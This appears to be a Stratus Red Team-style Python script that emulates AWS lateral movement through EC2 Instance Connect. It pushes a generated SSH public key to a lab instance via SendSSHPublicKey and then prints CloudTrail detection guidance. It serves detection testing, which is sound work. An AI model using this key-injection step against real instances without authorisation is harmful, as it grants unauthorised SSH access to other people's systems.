"""
Technique : aws.lateral-movement.ec2-instance-connect
Tactic    : Lateral Movement (T1021.004)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.lateral-movement.ec2-instance-connect/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the EC2 instance.

How the attack works:
  An attacker pushes their RSA public key to an EC2 instance via the
  EC2 Instance Connect API (SendSSHPublicKey). This grants a 60-second
  window to SSH into the instance as the specified OS user without
  persistent key installation on the instance.

Detection signal:
  - ec2-instance-connect:SendSSHPublicKey in CloudTrail from an unexpected
    principal or source IP address.

Revert:
  - Nothing to revert (the injected public key expires automatically after 60s).
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir, capture_output=True, text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}\n  {msg}\n{'=' * 60}")


# Fallback public key used if the cryptography library is unavailable.
# This is a placeholder — not a real usable key.
_FALLBACK_PUBKEY = (
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFakeKeyForStratusRedTeamTesting"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    " stratus-red-team-test"
)


def generate_ssh_public_key() -> str:
    """Generate a temporary RSA-2048 SSH public key in OpenSSH format."""
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import rsa

        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        return key.public_key().public_bytes(
            serialization.Encoding.OpenSSH,
            serialization.PublicFormat.OpenSSH,
        ).decode("utf-8")
    except ImportError:
        print("  [~] cryptography library not installed — using fallback public key (non-functional)")
        return _FALLBACK_PUBKEY


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir         = str(Path(__file__).parent.parent / "infra")
    infra             = get_pulumi_outputs(stack_dir)
    instance_id       = infra.get("instance_id", "")
    availability_zone = infra.get("availability_zone", "")
    public_ip         = infra.get("public_ip", "")
    ec2_username      = infra.get("ec2_username", "ec2-user")

    if not instance_id:
        print("[!] instance_id not found. Did you run `pulumi up`?")
        return

    session = boto3.Session()
    ec2ic   = session.client("ec2-instance-connect")

    banner("Step 1 — Generate temporary RSA-2048 SSH public key")
    public_key = generate_ssh_public_key()
    print(f"  [+] Public key generated ({len(public_key)} bytes)")

    banner("Step 2 — Send SSH public key via EC2 Instance Connect (SendSSHPublicKey)")
    try:
        response   = ec2ic.send_ssh_public_key(
            InstanceId=instance_id,
            InstanceOSUser=ec2_username,
            SSHPublicKey=public_key,
            AvailabilityZone=availability_zone,
        )
        success    = response.get("Success", False)
        request_id = response.get("RequestId", "")
        print(f"  [+] SendSSHPublicKey: Success={success}")
        print(f"  [+] RequestId: {request_id}")
        print(f"  [!] CloudTrail event: ec2-instance-connect:SendSSHPublicKey")
        print(f"  [!] 60-second SSH window open — connect: ssh {ec2_username}@{public_ip}")
    except ClientError as exc:
        err = exc.response["Error"]
        print(f"  [!] SendSSHPublicKey: {err['Code']} — {err['Message']}")
        if err["Code"] == "EC2InstanceTypeInvalidForConnectService":
            print("  [~] Instance type does not support EC2 Instance Connect.")
        print("  [~] The CloudTrail attempt event is still generated on failure.")

    banner("Complete")
    print("CloudTrail event generated: ec2-instance-connect:SendSSHPublicKey")
    print("\nDetection guidance:")
    print("  Alert on SendSSHPublicKey from unexpected principals or source IPs.")
    print("  Chain: reconnaissance -> SendSSHPublicKey -> SSH within 60s window.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the instance.")


if __name__ == "__main__":
    main()
